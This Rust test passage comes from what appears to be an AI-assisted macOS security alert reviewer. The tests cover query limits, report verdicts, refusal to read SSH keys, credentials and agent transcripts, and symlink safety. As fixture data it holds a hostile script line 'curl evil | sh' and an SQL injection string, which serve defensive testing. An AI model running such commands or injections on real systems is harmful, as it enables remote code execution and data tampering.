                Pred::Has("judge.warrants_investigation".to_string()),
            ],
            none: vec![Pred::Has("_context".to_string())],
        }]
    }

    fn process_logs(input: Vec<Logview>) -> Result<Vec<u8>, String> {
        let mut out = Vec::new();
        for lv in input {
            let Ok(alert) = serde_json::from_str::<Value>(&lv.log()) else {
                continue;
            };
            out.extend(reviewed(&alert).to_string().into_bytes());
            out.push(b'\n');
        }
        Ok(out)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn alert() -> Value {
        json!({"source": "macos_session",
               "session": {"id": "501", "entry": "zsh", "from": "2026-03-02T10:00:00.000Z", "to": "2026-03-02T10:05:00.250Z"},
               "judge": {"warrants_investigation": "look", "why": "a key was read by a package script"}})
    }

    /// A model that answers with these turns in order: each a list of
    /// (tool, arguments), or none for prose.
    fn model(
        turns: Vec<Vec<(&'static str, Value)>>,
    ) -> impl FnMut(&Value) -> Result<Value, String> {
        let mut turns = turns.into_iter();
        let mut n = 0;
        move |_request| {
            let calls: Vec<Value> = turns
                .next()
                .unwrap_or_default()
                .into_iter()
                .map(|(name, arguments)| {
                    n += 1;
                    json!({"id": {"provider": format!("call_{n}")}, "name": name, "arguments": arguments})
                })
                .collect();
            let stop = if calls.is_empty() { "stop" } else { "tool_use" };
            Ok(
                json!({"message": {"role": "assistant", "content": []}, "text": "", "calls": calls,
                      "stop": stop, "usage": {"input_tokens": 10, "output_tokens": 2, "cached_input_tokens": 4}}),
            )
        }
    }

    fn held() -> Value {
        json!({"n": 3, "first": "2026-03-01T00:00:00Z", "last": "2026-03-02T10:05:00Z", "whole": true})
    }

    fn report(verdict: &str) -> (&'static str, Value) {
        (
            "report",
            json!({"finding": "node read ~/.ssh/id_ed25519 under npm install.", "verdict": verdict}),
        )
    }

    #[test]
    fn queries_then_a_report() {
        let mut asked = Vec::new();
        let (answer, ran, took, _) = review(
            &alert(),
            &held(),
            20,
            false,
            |sql| {
                asked.push(sql.to_string());
                ("| n |\n| 3 |".into(), true)
            },
            None,
            model(vec![
                vec![("query", json!({"sql": "SELECT count(*) FROM records"}))],
                vec![("query", json!({"sql": "SELECT nope"}))],
                vec![report("malicious")],
            ]),
        );
        assert_eq!(answer["verdict"], "malicious");
        assert_eq!(ran, asked);
        assert_eq!(ran.len(), 2);
        let took = took.json();
        assert_eq!(
            (took["calls"].as_u64(), took["input_tokens"].as_u64()),
            (Some(3), Some(30))
        );
        assert_eq!(took["cache_read_tokens"], 12);
    }

    /// What a review's record keeps of how it went: each turn's reasoning
    /// and words, its calls and the start of what each was given back.
    #[test]
    fn the_steps_are_each_turn_s_thinking_its_calls_and_what_came_back() {
        let mut turns = vec![
            json!({"thinking": "The key read is the lead: who read it?", "text": "",
                   "calls": [{"id": 1, "name": "query", "arguments": {"sql": "SELECT 1"}},
                             {"id": 2, "name": "query", "arguments": {"sql": "SELECT nope"}}]}),
            json!({"thinking": "", "text": "It was npm's own script.",
                   "calls": [{"id": 3, "name": "report",
                              "arguments": {"finding": "npm read its own token.", "verdict": "benign"}}]}),
        ]
        .into_iter();
        let (answer, _, _, steps) = review(
            &alert(),
            &held(),
            20,
            false,
            |sql| match sql {
                "SELECT 1" => ("x".repeat(STEP_LIMIT + 7), true),
                _ => ("error: no column nope".into(), false),
            },
            None,
            |_| {
                let mut turn = turns.next().unwrap();
                turn["message"] = json!({"role": "assistant", "content": []});
                turn["stop"] = json!("tool_use");
                Ok(turn)
            },
        );
        assert_eq!(answer["verdict"], "benign");
        assert_eq!(steps.len(), 2, "{steps:?}");
        assert_eq!(
            steps[0]["thinking"],
            "The key read is the lead: who read it?"
        );
        assert!(steps[0].get("said").is_none());
        let asked = &steps[0]["calls"];
        assert_eq!(
            (&asked[0]["tool"], &asked[0]["sql"]),
            (&json!("query"), &json!("SELECT 1"))
        );
        let result = asked[0]["result"].as_str().unwrap();
        assert!(result.ends_with("[cut: 7 more characters]"), "{result}");
        assert!(asked[0].get("failed").is_none());
        assert_eq!(asked[1]["result"], "error: no column nope");
        assert_eq!(asked[1]["failed"], true);
        // the report is the review, which the record holds whole
        assert_eq!(steps[1]["said"], "It was npm's own script.");
        assert_eq!(steps[1]["calls"], json!([{"tool": "report"}]));
    }

    #[test]
    fn the_conversation_is_the_alert_then_each_turn_and_its_results() {
        let mut seen = Vec::new();
        let mut answers = model(vec![
            vec![("query", json!({"sql": "SELECT 1"}))],
            vec![report("benign")],
        ]);
        review(
            &alert(),
            &held(),
            20,
            false,
            |_| ("(no rows)".into(), false),
            None,
            |request| {
                seen.push(request.clone());
                answers(request)
            },
        );
        let first = seen[0]["messages"][0]["text"].as_str().unwrap();
        assert!(first.starts_with("The `records` table holds 3 records, from 2026-03-01T00:00:00Z to 2026-03-02T10:05:00Z."));
        assert!(first.contains("- `parents`: a list"));
        assert!(first.contains("a key was read by a package script"));
        assert_eq!(seen[0]["cache"], true);
        // without the tool the model is not offered it, or told of it
        assert_eq!(seen[0]["tools"][1]["name"], "report");
        assert!(!first.contains("read_file"));
        // the second request: the model's turn as it came, then the result under the call's id
        let messages = seen[1]["messages"].as_array().unwrap();
        assert_eq!(messages[1]["role"], "assistant");
        let result = &messages[2]["results"][0];
        assert_eq!(result["id"], json!({"provider": "call_1"}));
        assert_eq!(
            (result["name"].as_str(), result["error"].as_bool()),
            (Some("query"), Some(true))
        );
    }

    #[test]
    fn a_report_with_no_such_verdict_is_sent_back() {
        let (answer, _, took, _) = review(
            &alert(),
            &held(),
            20,
            false,
            |_| unreachable!(),
            None,
            model(vec![vec![report("suspicious")], vec![report("unresolved")]]),
        );
        assert_eq!(answer["verdict"], "unresolved");
        assert_eq!(took.calls, 2);
    }

    /// A report in a turn with queries was written before their results: the
    /// queries run, the report is sent back, and the next one stands.
    #[test]
    fn a_report_beside_a_query_waits_for_the_result() {
        let mut seen = Vec::new();
        let mut answers = model(vec![
            vec![("query", json!({"sql": "SELECT 1"})), report("benign")],
            vec![report("malicious")],
        ]);
        let (answer, ran, _, _) = review(
            &alert(),
            &held(),
            20,
            false,
            |_| ("| n |\n| 1 |".into(), true),
            None,
            |request| {
                seen.push(request.clone());
                answers(request)
            },
        );
        assert_eq!(answer["verdict"], "malicious");
        assert_eq!(ran, ["SELECT 1"]);
        let results = &seen[1]["messages"][2]["results"];
        assert_eq!(results[0]["error"], false);
        assert!(results[1]["text"].as_str().unwrap().contains("on its own"));
    }

    /// A tool the model made up is not a query: nothing runs, and none of
    /// the queries allowed is spent.
    #[test]
    fn a_tool_that_is_not_one_is_not_run() {
        let (answer, ran, _, _) = review(
            &alert(),
            &held(),
            1,
            false,
            |_| unreachable!(),
            None,
            model(vec![
                vec![("read_memory", json!({"sql": "SELECT 1"}))],
                vec![report("benign")],
            ]),
        );
        assert_eq!(answer["verdict"], "benign");
        assert!(ran.is_empty());
    }

    #[test]
    fn a_review_before_the_lake_has_the_alert_s_records_is_told_so() {
        let mut behind = held();
        behind["whole"] = json!(false);
        assert!(
            first_message(&alert(), &behind).contains("does not yet hold the alert's last records")
        );
        assert!(!first_message(&alert(), &held()).contains("does not yet hold"));
    }

    #[test]
    fn queries_past_the_limit_are_not_run() {
        let mut run = 0;
        let query = || ("query", json!({"sql": "SELECT 1"}));
        let (answer, ran, _, _) = review(
            &alert(),
            &held(),
            2,
            false,
            |_| {
                run += 1;
                ("ok".into(), true)
            },
            None,
            model(vec![
                vec![query(), query(), query()],
                vec![report("benign")],
            ]),
        );
        assert_eq!((run, ran.len()), (2, 2));
        assert_eq!(answer["verdict"], "benign");
    }

    #[test]
    fn an_answer_in_prose_is_asked_for_as_a_report_and_never_reporting_is_an_error() {
        let (answer, _, _, _) = review(
            &alert(),
            &held(),
            20,
            false,
            |_| unreachable!(),
            None,
            model(vec![vec![], vec![report("benign")]]),
        );
        assert_eq!(answer["verdict"], "benign");
        let (answer, _, took, _) = review(
            &alert(),
            &held(),
            20,
            false,
            |_| unreachable!(),
            None,
            model(vec![]),
        );
        assert_eq!(answer["error"], "the model gave no report");
        assert_eq!(took.calls, 3);
    }

    #[test]
    fn a_model_that_fails_is_the_error_and_the_alert_stands() {
        let (answer, ran, _, _) = review(
            &alert(),
            &held(),
            20,
            false,
            |_| unreachable!(),
            None,
            |_| Err("the model failed the turn: content filtered".to_string()),
        );
        assert_eq!(
            answer["error"],
            "the model failed the turn: content filtered"
        );
        assert!(ran.is_empty());
    }

    #[test]
    fn the_view_ends_where_the_alert_does() {
        let until = sql_time("2026-03-02T10:05:00.250Z").unwrap();
        let v = view("lake", &until, 7, 400);
        assert!(v.starts_with("SELECT ts AS ts, event AS event, \"session\"['id'] AS session, "));
        // a record with no time the lake could read is kept, not lost to the bounds
        assert!(v.contains(
            "WHERE ts IS NULL OR (ts <= arrow_cast('2026-03-02T10:05:00+00:00', 'Timestamp(Millisecond, Some(\"+00:00\"))') + INTERVAL '401 seconds'"
        ));
        assert!(v.ends_with("- INTERVAL '7 days')"));
        // a home is written as the alert writes it
        assert!(
            v.contains("regexp_replace(process['path'], '^/Users/[^/]+/', '~/') END AS program")
        );
        assert_eq!(
            sql_time("2026-03-02T10:05:00Z").as_deref(),
            Some("2026-03-02T10:05:00+00:00")
        );
        // what is not a time in UTC is none, and is never put in the SQL
        for not in [
            "2026-03-02 10:05:00Z",
            "2026-03-02T10:05:00+02:00",
            "2026-03-02T10:05:00",
            "2026-03-02T10:05:00.Z",
            "x' OR 1=1 --........",
        ] {
            assert_eq!(sql_time(not), None, "{not}");
        }
    }

    #[test]
    fn a_long_result_is_cut_and_an_empty_one_says_so() {
        let cut = shown("é".repeat(RESULT_LIMIT + 40));
        assert!(cut.ends_with("[cut: 40 more characters; select fewer columns or rows]"));
        assert_eq!(shown("  \n".into()), "(no rows)");
        assert_eq!(shown("| n |".into()), "| n |");
    }

    /// A directory that stands for `/`, with these files under it; removed
    /// when dropped.
    struct Root(std::path::PathBuf);

    impl Root {
        fn new(tag: &str, files: &[(&str, &[u8])]) -> Self {
            let dir =
                std::env::temp_dir().join(format!("macos-review-{tag}-{}", std::process::id()));
            let _ = std::fs::remove_dir_all(&dir);
            for (path, text) in files {
                let at = dir.join(path.trim_start_matches('/'));
                std::fs::create_dir_all(at.parent().unwrap()).unwrap();
                std::fs::write(at, text).unwrap();
            }
            Root(dir)
        }

        fn link(&self, from: &str, to: &str) {
            let at = self.0.join(from.trim_start_matches('/'));
            std::fs::create_dir_all(at.parent().unwrap()).unwrap();
            std::os::unix::fs::symlink(to, at).unwrap();
        }

        /// `read_file` with a log that gives a reason for these paths.
        fn read(&self, path: &str, reasons: &[&str]) -> (String, bool) {
            read_file(&self.0, Some("/Users/dev"), path, &mut |p| {
                (reasons.contains(&p), "the log gives no reason".to_string())
            })
        }
    }

    impl Drop for Root {
        fn drop(&mut self) {
            let _ = std::fs::remove_dir_all(&self.0);
        }
    }

    const SETTINGS: &str = "/Users/dev/.claude/settings.json";

    #[test]
    fn a_permitted_file_is_its_size_its_time_and_its_text() {
        let root = Root::new("read", &[(SETTINGS, b"{\"hooks\": {}}")]);
        let (text, ok) = root.read(SETTINGS, &[SETTINGS]);
        assert!(ok);
        assert!(
            text.starts_with("/Users/dev/.claude/settings.json: 13 bytes, last changed 20"),
            "{text}"
        );
        assert!(text.ends_with("Z\n\n{\"hooks\": {}}"), "{text}");
        // from `~`, and with a `..` in it: the path is made whole before it is judged
        assert!(root.read("~/.claude/settings.json", &[SETTINGS]).1);
        assert!(
            root.read("/Users/dev/code/../.claude/./settings.json", &[SETTINGS])
                .1
        );
        assert_eq!(
            root.read("settings.json", &[SETTINGS]).0,
            "error: an absolute path, as the log has it"
        );
    }

    const KEY: &str = "/Users/dev/.ssh/id_ed25519";
    const KEPT: &str =
        "not read: the pack keeps it as credentials or an agent's transcripts, which are not read";

    #[test]
    fn a_file_the_log_gives_no_reason_for_is_not_read() {
        let root = Root::new("refused", &[("/Users/dev/notes.txt", b"dear diary")]);
        let (text, ok) = root.read("/Users/dev/notes.txt", &[SETTINGS]);
        assert!(!ok);
        assert_eq!(text, "not read: the log gives no reason");
        // and a file that is gone says so
        let (text, ok) = root.read(SETTINGS, &[SETTINGS]);
        assert!(!ok);
        assert!(
            text.starts_with("not read: ") && text.contains("the file as it is now"),
            "{text}"
        );
    }

    /// A key is not read whatever the log says of it: a command line that
    /// names one (`python --version ~/.ssh/id_ed25519`) is in the log as a
    /// script run.
    #[test]
    fn credentials_and_transcripts_are_never_read() {
        let transcript = "/Users/dev/.claude/projects/x/1.jsonl";
        let root = Root::new("kept", &[(KEY, b"key"), (transcript, b"{}")]);
        for path in [
            KEY,
            "~/.ssh/id_ed25519",
            "/Users/dev/code/../.ssh/id_ed25519",
            transcript,
        ] {
            assert_eq!(
                root.read(path, &[KEY, transcript]),
                (KEPT.to_string(), false),
                "{path}"
            );
        }
        // nor is one said to be there or not
        assert_eq!(root.read("/Users/dev/.aws/credentials", &[]).0, KEPT);
    }

    #[test]
    fn with_no_data_directory_no_file_is_read() {
        let gone = std::env::temp_dir().join("macos-review-no-such-root");
        let (text, ok) = read_file(&gone, None, SETTINGS, &mut |_| unreachable!());
        assert!(
            !ok && text.starts_with("error: no file can be read"),
            "{text}"
        );
    }

    #[test]
    fn a_link_is_read_only_when_where_it_leads_may_be() {
        let root = Root::new(
            "link",
            &[
                (KEY, b"key"),
                ("/Users/dev/notes.txt", b"dear diary"),
                ("/Users/dev/dotfiles/settings.json", b"{}"),
            ],
        );
        // a settings file that is a link to a key is not read, whatever the log says of either
        root.link(SETTINGS, KEY);
        let (text, ok) = root.read(SETTINGS, &[SETTINGS, KEY]);
        assert!(!ok);
        assert!(text.starts_with("not read: it is a link to /Users/dev/.ssh/id_ed25519, and the pack keeps it as credentials"), "{text}");
        // nor one that is a link to a file the log gives no reason for
        root.link(
            "/Users/dev/proj/.claude/settings.json",
            "/Users/dev/notes.txt",
        );
        let linked = "/Users/dev/proj/.claude/settings.json";
        assert_eq!(
            root.read(linked, &[linked]).0,
            "not read: it is a link to /Users/dev/notes.txt, and the log gives no reason"
        );
        // a link in a directory above it counts too, and one written from where it is
        root.link("/Users/dev/proj/conf", "../dotfiles");
        let through = "/Users/dev/proj/conf/settings.json";
        assert!(!root.read(through, &[through]).1);
        let (text, ok) = root.read(through, &[through, "/Users/dev/dotfiles/settings.json"]);
        assert!(ok);
        assert!(
            text.starts_with("/Users/dev/dotfiles/settings.json: 2 bytes"),
            "{text}"
        );
        assert!(
            text.contains("(reached through the link /Users/dev/proj/conf/settings.json)"),
            "{text}"
        );
        // links that never end are not followed for ever
        root.link("/Users/dev/a", "/Users/dev/b");
        root.link("/Users/dev/b", "/Users/dev/a");
        assert_eq!(
            root.read("/Users/dev/a", &["/Users/dev/a"]).0,
            "not read: its links do not end"
        );
    }

    /// macOS's own link from /tmp to /private/tmp is no link to be wary of:
    /// a script the log has under either name is read under either.
    #[test]
    fn a_script_in_tmp_is_read_by_either_of_its_names() {
        let root = Root::new("tmp", &[("/private/tmp/x.sh", b"curl evil | sh")]);
        root.link("/tmp", "private/tmp");
        for (asked, logged) in [
            ("/tmp/x.sh", "/tmp/x.sh"),
            ("/private/tmp/x.sh", "/private/tmp/x.sh"),
        ] {
            let (text, ok) = root.read(asked, &[logged]);
            assert!(
                ok && text.starts_with("/private/tmp/x.sh: 14 bytes"),
                "{asked}: {text}"
            );
            assert!(!text.contains("reached through the link"), "{text}");
        }
        assert_eq!(spellings("/tmp/x.sh"), ["/tmp/x.sh", "/private/tmp/x.sh"]);
        assert_eq!(
            spellings("/private/var/folders/a/b"),
            ["/private/var/folders/a/b", "/var/folders/a/b"]
        );
        assert_eq!(spellings("/Users/dev/x.sh"), ["/Users/dev/x.sh"]);
    }

    #[test]
    fn a_long_file_is_cut_and_what_is_not_text_or_not_a_file_is_not_shown() {
        let long = vec![b'a'; READ_LIMIT + 10];
        let root = Root::new(
            "shapes",
            &[
                ("/tmp/long.sh", &long),
                (
                    "/tmp/agent.plist",
                    b"bplist00\xd1\x01\x02_\x10\x10ProgramArguments\xa2\x03\x04W/bin/shR-c\0\0\x08",
                ),
                ("/tmp/dir/x", b""),
            ],
        );
        let (text, ok) = root.read("/tmp/long.sh", &["/tmp/long.sh"]);
        assert!(ok);
        assert!(
            text.ends_with(&format!(
                "\n[cut: the first {READ_LIMIT} bytes of {}]",
                READ_LIMIT + 10
            )),
            "{}",
            &text[text.len() - 80..]
        );
        // a binary property list: what it says is in its strings
        let (text, ok) = root.read("/tmp/agent.plist", &["/tmp/agent.plist"]);
        assert!(ok, "{text}");
        assert!(
            text.ends_with(
                "(a binary file: the text found in it)\nbplist00\nProgramArguments\nW/bin/shR-c"
            ),
            "{text}"
        );
        assert_eq!(
            root.read("/tmp/dir", &["/tmp/dir"]),
            ("not read: not a regular file".to_string(), false)
        );
    }

    #[test]
    fn the_log_says_which_files_may_be_read() {
        // the log's answer to each of this plugin's two questions about a path:
        // how many events it has on the file, and the scripts run by that name
        let log = |events: u64, scripts: &'static [&'static str]| {
            move |sql: &str| -> Result<Vec<Value>, String> {
                if sql.contains("count(*) AS n") {
                    Ok(vec![json!({"n": events})])
                } else {
                    assert!(sql.contains("strpos(script, '"), "{sql}");
                    Ok(scripts.iter().map(|s| json!({"script": s})).collect())
                }
            }
        };
        let home = Some("/Users/dev");
        // what steers an agent or runs later, when the log has an event on it
        assert!(permitted(SETTINGS, home, &mut log(2, &[])).0);
        assert!(!permitted(SETTINGS, home, &mut log(0, &[])).0);
        // run as a script, as the pack writes it from `~`, or whole, or by a longer way round
        let path = "/Users/dev/it's.sh";
        assert!(permitted(path, home, &mut log(0, &["zsh ~/it's.sh"])).0);
        assert!(permitted(path, home, &mut log(0, &["python /Users/dev/it's.sh"])).0);
        assert!(permitted(path, home, &mut log(0, &["zsh ~/code/../it's.sh"])).0);
        assert!(permitted("/tmp/x.sh", home, &mut log(0, &["sh /private/tmp/x.sh"])).0);
        // `~` is this Mac's owner: another user's file of the same name is not the script
        assert!(
            !permitted(
                "/Users/other/it's.sh",
                home,
                &mut log(0, &["zsh ~/it's.sh"])
            )
            .0
        );
        assert!(
            !permitted(
                "/Users/Shared/it's.sh",
                home,
                &mut log(0, &["zsh ~/it's.sh"])
            )
            .0
        );
        // another script of the same name, or no record at all
        assert!(!permitted(path, home, &mut log(0, &["zsh ~/other/it's.sh"])).0);
        let (ok, why) = permitted(path, home, &mut log(0, &[]));
        assert!(
            !ok && why.starts_with("the log does not show it run as a script"),
            "{why}"
        );
        // a name with a quote in it is a string in the SQL, and a lake that cannot be asked gives no leave
        permitted(path, home, &mut |sql| {
            assert!(sql.ends_with("strpos(script, 'it''s.sh') > 0"), "{sql}");
            Ok(Vec::new())
        });
        assert!(!permitted(path, home, &mut |_| Err("no table".into())).0);
        assert!(!permitted(SETTINGS, home, &mut |_| Err("no table".into())).0);
    }

    #[test]
    fn a_file_is_read_when_the_tool_is_given_and_counts_as_a_query() {
        let mut seen = Vec::new();
        let mut answers = model(vec![
            vec![("read_file", json!({"path": SETTINGS}))],
            vec![("query", json!({"sql": "SELECT 1"}))],
            vec![("read_file", json!({"path": "/etc/hosts"}))],
            vec![report("unresolved")],
        ]);
        let mut read = |path: &str| (format!("{path}: 2 bytes\n\n{{}}"), true);
        let mut refused = |_: &str| ("not read: the log gives no reason".to_string(), false);
        let (_, _, took, _) = review(
            &alert(),
            &held(),
            1,
            false,
            |_| unreachable!(),
            Some(&mut refused),
            model(vec![
                vec![("read_file", json!({"path": "/etc/hosts"}))],
                vec![("read_file", json!({"path": SETTINGS}))],
                vec![report("unresolved")],
            ]),
        );
        assert!(
            took.files.is_empty(),
            "a file that was not read is not listed"
        );
        let (answer, ran, took, _) = review(
            &alert(),
            &held(),
            2,
            false,
            |_| ("ok".into(), true),
            Some(&mut read),
            |request| {
                seen.push(request.clone());
                answers(request)
            },
        );
        assert_eq!(answer["verdict"], "unresolved");
        assert_eq!(
            (ran.len(), took.files.len()),
            (1, 1),
            "the third look is past the limit"
        );
        assert_eq!(took.files, [SETTINGS]);
        // the model is offered the tool and told of it, and gets the file's text
        assert_eq!(seen[0]["tools"][1]["name"], "read_file");
        assert!(seen[0]["messages"][0]["text"]
            .as_str()
            .unwrap()
            .starts_with("You can also read what a file says"));
        assert!(seen[1]["messages"][2]["results"][0]["text"]
            .as_str()
            .unwrap()
            .starts_with(SETTINGS));
        let last = &seen[3]["messages"][6]["results"][0];
        assert_eq!(
            last["text"],
            "No queries are left. Call `report` with what you have."
        );
    }

    #[test]
    fn a_time_is_written_in_utc() {
        assert_eq!(rfc3339(0), "1970-01-01T00:00:00Z");
        assert_eq!(rfc3339(1_772_445_900), "2026-03-02T10:05:00Z");
        assert_eq!(rfc3339(951_782_400), "2000-02-29T00:00:00Z");
    }
}
